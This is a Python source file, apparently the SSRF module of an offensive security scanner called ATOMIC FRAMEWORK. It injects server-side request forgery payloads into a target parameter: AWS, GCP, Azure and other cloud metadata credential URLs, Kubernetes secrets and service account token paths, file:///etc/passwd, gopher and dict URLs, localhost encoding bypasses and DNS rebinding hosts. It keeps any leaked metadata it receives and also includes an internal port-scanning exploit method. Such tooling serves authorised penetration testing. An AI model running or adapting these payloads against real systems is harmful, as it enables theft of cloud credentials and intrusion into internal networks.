#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - SSRF Module
Server-Side Request Forgery detection and exploitation
"""

from config import Colors
from modules.base import BaseModule


class SSRFModule(BaseModule):
    """SSRF Testing Module"""

    name = "SSRF"
    vuln_type = "ssrf"

    def __init__(self, engine):
        super().__init__(engine)

        # Cloud metadata endpoints
        self.cloud_endpoints = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data",
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/",
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            ],
            "digitalocean": [
                "http://169.254.169.254/metadata/v1/",
            ],
            "alibaba": [
                "http://100.100.100.200/latest/meta-data/",
            ],
            "aws_imdsv2": [
                "http://169.254.169.254/latest/api/token",
            ],
            "kubernetes": [
                "https://kubernetes.default.svc/api/v1/namespaces/default/pods",
                "https://kubernetes.default.svc/api/v1/secrets",
            ],
        }

        # SSRF response indicators (more specific to avoid false positives)
        self.ssrf_indicators = {
            "strong": [
                "ami-id",
                "instance-id",
                "instance-type",
                "AccessKeyId",
                "SecretAccessKey",
                "computeMetadata",
                "security-credentials",
            ],
            "weak": [
                "local-hostname",
                "local-ipv4",
                "public-hostname",
                "public-ipv4",
                "security-groups",
                "ec2",
                "Token",
            ],
        }

    def test(self, url: str, method: str, param: str, value: str):
        """Test for SSRF"""
        # Test internal endpoints
        self._test_internal(url, method, param, value)

        # Test cloud metadata
        self._test_cloud_metadata(url, method, param, value)

        # Test localhost variants
        self._test_localhost(url, method, param, value)

        # Test protocol wrappers
        self._test_protocols(url, method, param, value)

        # Test DNS rebinding
        self._test_dns_rebinding(url, method, param, value)

        # Test PDF generation SSRF
        self._test_pdf_ssrf(url, method, param, value)

        # Test Kubernetes metadata
        self._test_kubernetes_metadata(url, method, param, value)

        # Test blind SSRF via timing
        self._test_time_based_ssrf(url, method, param, value)

        # LLM-generated adaptive SSRF payloads
        self._test_llm_payloads(url, method, param, value)

    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
        """Test with LLM-generated SSRF payloads.

        Leverages Qwen2.5-7B to generate context-aware SSRF payloads
        when ``--local-llm`` is active.
        """
        ai = getattr(self.engine, "ai", None)
        if ai is None:
            return
        llm_payloads = ai.get_llm_payloads("ssrf", param)
        if not llm_payloads:
            return

        # Get baseline to filter pre-existing indicators
        try:
            baseline_response = self.requester.request(url, method, data={param: value})
            baseline_lower = baseline_response.text.lower() if baseline_response else ""
        except Exception:
            baseline_lower = ""

        for payload in llm_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                resp_lower = response.text.lower()
                for ind in self.ssrf_indicators.get("strong", []):
                    # Only flag if indicator is NEW (not in baseline)
                    if ind.lower() in resp_lower and ind.lower() not in baseline_lower:
                        from core.engine import Finding

                        finding = Finding(
                            technique="SSRF (AI-generated)",
                            url=url,
                            severity="HIGH",
                            confidence=0.80,
                            param=param,
                            payload=payload,
                            evidence=f"AI payload triggered SSRF indicator: {ind}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue

    def _test_dns_rebinding(self, url: str, method: str, param: str, value: str):
        """Test for DNS rebinding SSRF"""
        payloads = [
            "http://7f000001.c0a80001.rbndr.us/",
            "http://0x7f000001/",
            "http://[::1]/",
            "http://127.1/",
            "http://127.0.0.1.nip.io/",
        ]

        # Get baseline to filter pre-existing indicators
        try:
            baseline_response = self.requester.request(url, method, data={param: value})
            baseline_lower = baseline_response.text.lower() if baseline_response else ""
        except Exception:
            baseline_lower = ""

        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                text = response.text.lower()
                # Only check strong indicators and require them to be NEW
                for indicator in self.ssrf_indicators.get("strong", []):
                    if indicator.lower() in text and indicator.lower() not in baseline_lower:
                        from core.engine import Finding

                        finding = Finding(
                            technique="SSRF (DNS Rebinding)",
                            url=url,
                            severity="HIGH",
                            confidence=0.8,
                            param=param,
                            payload=payload,
                            evidence=f"DNS rebinding indicator: {indicator}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue

    def _test_pdf_ssrf(self, url: str, method: str, param: str, value: str):
        """Test for SSRF via PDF generation"""
        payloads = [
            '<iframe src="http://169.254.169.254/latest/meta-data/">',
            '<img src="http://169.254.169.254/latest/meta-data/">',
        ]

        # Get baseline to filter pre-existing indicators
        try:
            baseline_response = self.requester.request(url, method, data={param: value})
            baseline_lower = baseline_response.text.lower() if baseline_response else ""
        except Exception:
            baseline_lower = ""

        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                text = response.text.lower()
                # Only check strong indicators and require them to be NEW
                for indicator in self.ssrf_indicators.get("strong", []):
                    if indicator.lower() in text and indicator.lower() not in baseline_lower:
                        from core.engine import Finding

                        finding = Finding(
                            technique="SSRF (PDF Generation)",
                            url=url,
                            severity="HIGH",
                            confidence=0.8,
                            param=param,
                            payload=payload,
                            evidence=f"PDF SSRF indicator: {indicator}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue

    def _test_kubernetes_metadata(self, url: str, method: str, param: str, value: str):
        """Test for Kubernetes metadata SSRF"""
        k8s_payloads = [
            "https://kubernetes.default.svc/api/v1/namespaces/default/pods",
            "https://kubernetes.default.svc/api/v1/secrets",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
        ]
        k8s_indicators = ["apiversion", "kind", "metadata", "serviceaccount", "kubernetes"]

        # Get baseline to filter pre-existing indicators
        try:
            baseline_response = self.requester.request(url, method, data={param: value})
            baseline_lower = baseline_response.text.lower() if baseline_response else ""
        except Exception:
            baseline_lower = ""

        for payload in k8s_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                text = response.text.lower()
                # Require at least 2 NEW indicators to reduce false positives
                new_matches = sum(1 for ind in k8s_indicators if ind in text and ind not in baseline_lower)
                if new_matches >= 2:
                    from core.engine import Finding

                    finding = Finding(
                        technique="SSRF (Kubernetes Metadata)",
                        url=url,
                        severity="CRITICAL",
                        confidence=0.9,
                        param=param,
                        payload=payload,
                        evidence=f"K8s indicators found: {new_matches} new matches",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def _test_time_based_ssrf(self, url: str, method: str, param: str, value: str):
        """Test for blind SSRF via response timing differences"""
        import time

        # Measure baseline
        try:
            start = time.time()
            self.requester.request(url, method, data={param: value})
            baseline = time.time() - start
        except Exception:
            baseline = 0

        # Test with a non-routable IP that should cause timeout delay
        timing_payloads = [
            "http://10.255.255.1/",  # Non-routable, should timeout
            "http://192.168.255.255/",  # Non-routable private
            "http://172.31.255.255:65535/",  # Unlikely to respond
        ]
        for payload in timing_payloads:
            try:
                start = time.time()
                self.requester.request(url, method, data={param: payload})
                elapsed = time.time() - start
                # If response takes significantly longer, server may be trying to connect
                if elapsed > baseline + 3.0 and elapsed >= 3.5:
                    from core.engine import Finding

                    finding = Finding(
                        technique="SSRF (Blind / Time-based)",
                        url=url,
                        severity="MEDIUM",
                        confidence=0.6,
                        param=param,
                        payload=payload,
                        evidence=f"Response delayed {elapsed:.1f}s (baseline {baseline:.1f}s) — possible blind SSRF",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def test_url(self, url: str):
        """Test URL for SSRF"""

    def _test_internal(self, url: str, method: str, param: str, value: str):
        """Test for internal network access"""
        internal_targets = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://0177.0.0.1",
            "http://2130706433",
            "http://0x7f.0.0.1",
            "http://0x7f000001",
        ]

        # Get baseline response for comparison
        try:
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            if not baseline:
                return
            baseline_len = len(baseline.text)
            baseline_text = baseline.text.lower()
        except Exception:
            return

        for target in internal_targets:
            try:
                data = {param: target}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                # Check for successful internal access
                if response.status_code == 200 and len(response.text) > 0:
                    response_text = response.text.lower()
                    response_len = len(response.text)

                    # Skip if response looks like an error page
                    if any(err in response_text for err in ["error", "not found", "forbidden"]):
                        continue

                    # Response must differ significantly from baseline to indicate
                    # the server actually fetched from the internal target
                    len_diff = abs(response_len - baseline_len)
                    if len_diff < 50 and response_text == baseline_text:
                        continue

                    # Look for internal content indicators
                    internal_indicators = [
                        "apache",
                        "nginx",
                        "iis",
                        "index of",
                        "directory listing",
                        "it works",
                        "127.0.0.1",
                        "localhost",
                        "server at",
                        "port ",
                    ]
                    has_internal = any(ind in response_text for ind in internal_indicators)
                    baseline_has = any(ind in baseline_text for ind in internal_indicators)

                    if has_internal and not baseline_has:
                        from core.engine import Finding

                        finding = Finding(
                            technique="SSRF (Internal Access)",
                            url=url,
                            severity="HIGH",
                            confidence=0.8,
                            param=param,
                            payload=target,
                            evidence=f"Internal endpoint accessible: {target}",
                        )
                        self.engine.add_finding(finding)
                        return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'SSRF internal test error: {e}')}")

    def _test_cloud_metadata(self, url: str, method: str, param: str, value: str):
        """Test for cloud metadata access"""
        for cloud, endpoints in self.cloud_endpoints.items():
            for endpoint in endpoints:
                try:
                    headers = {}
                    if cloud == "gcp":
                        headers["Metadata-Flavor"] = "Google"
                    elif cloud == "azure":
                        headers["Metadata"] = "true"

                    data = {param: endpoint}
                    response = self.requester.request(url, method, data=data, headers=headers)

                    if not response:
                        continue

                    # Check for cloud metadata indicators
                    # Require at least 1 strong indicator or 3+ weak indicators
                    strong_count = sum(
                        1 for ind in self.ssrf_indicators["strong"] if ind.lower() in response.text.lower()
                    )
                    weak_count = sum(1 for ind in self.ssrf_indicators["weak"] if ind.lower() in response.text.lower())

                    if strong_count >= 1 or weak_count >= 3:
                        from core.engine import Finding

                        finding = Finding(
                            technique=f"SSRF ({cloud.upper()} Metadata)",
                            url=url,
                            severity="CRITICAL",
                            confidence=0.95,
                            param=param,
                            payload=endpoint,
                            evidence=f"Cloud metadata accessible: {cloud}",
                            extracted_data=response.text[:500],
                        )
                        self.engine.add_finding(finding)
                        return

                except Exception as e:
                    if self.engine.config.get("verbose"):
                        print(f"{Colors.error(f'SSRF cloud test error: {e}')}")

    def _test_localhost(self, url: str, method: str, param: str, value: str):
        """Test localhost bypass techniques"""
        bypass_techniques = [
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:3000",
            "http://127.0.0.1:8000",
            "http://127.0.0.1:9000",
            "http://127.1",
            "http://0.0.0.0",
            "http://0",
            "http://0177.0.0.01",
            "http://0x7f.0.0.1",
            "http://2130706433",
            "http://[::]",
            "http://[::ffff:127.0.0.1]",
            "http://[0:0:0:0:0:ffff:127.0.0.1]",
        ]

        # Get baseline response for comparison
        try:
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            if not baseline:
                return
            baseline_len = len(baseline.text)
            baseline_text = baseline.text.lower()
        except Exception:
            return

        for payload in bypass_techniques:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                # Check for successful access
                if response.status_code == 200 and len(response.text) > 10:
                    response_text = response.text.lower()
                    response_len = len(response.text)

                    # Response must differ significantly from baseline
                    len_diff = abs(response_len - baseline_len)
                    if len_diff < 50 and response_text == baseline_text:
                        continue

                    # Look for internal content indicators
                    internal_indicators = [
                        "apache",
                        "nginx",
                        "iis",
                        "index of",
                        "directory listing",
                        "it works",
                        "server at",
                        "port ",
                    ]
                    has_internal = any(ind in response_text for ind in internal_indicators)
                    baseline_has = any(ind in baseline_text for ind in internal_indicators)

                    if has_internal and not baseline_has:
                        from core.engine import Finding

                        finding = Finding(
                            technique="SSRF (Localhost Bypass)",
                            url=url,
                            severity="HIGH",
                            confidence=0.75,
                            param=param,
                            payload=payload,
                            evidence=f"Localhost accessible via: {payload}",
                        )
                        self.engine.add_finding(finding)
                        return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'SSRF localhost test error: {e}')}")

    def _test_protocols(self, url: str, method: str, param: str, value: str):
        """Test different protocols"""
        protocols = [
            "file:///etc/passwd",
            "file:///C:/windows/win.ini",
            "dict://localhost:11211/",
            "gopher://localhost:9000/_",
            "ftp://anonymous@localhost/",
            "ldap://localhost:389/",
            "tftp://localhost:69/test",
        ]

        for protocol in protocols:
            try:
                data = {param: protocol}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                # Check for protocol-specific responses
                if protocol.startswith("file://"):
                    if "root:x:" in response.text or "for 16-bit app support" in response.text:
                        from core.engine import Finding

                        finding = Finding(
                            technique="SSRF (File Protocol)",
                            url=url,
                            severity="CRITICAL",
                            confidence=0.9,
                            param=param,
                            payload=protocol,
                            evidence="Local file readable via file:// protocol",
                        )
                        self.engine.add_finding(finding)
                        return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'SSRF protocol test error: {e}')}")

    def exploit_scan_port(self, url: str, param: str, host: str, port: int) -> bool:
        """Scan internal port via SSRF"""
        try:
            payload = f"http://{host}:{port}"
            data = {param: payload}
            response = self.requester.request(url, "GET", data=data)

            if response:
                # Analyze response to determine if port is open
                if response.status_code == 200 or len(response.text) > 0:
                    return True
        except Exception as e:
            if self.engine.config.get("verbose"):
                print(f"{Colors.error(f'Port scan error: {e}')}")

        return False
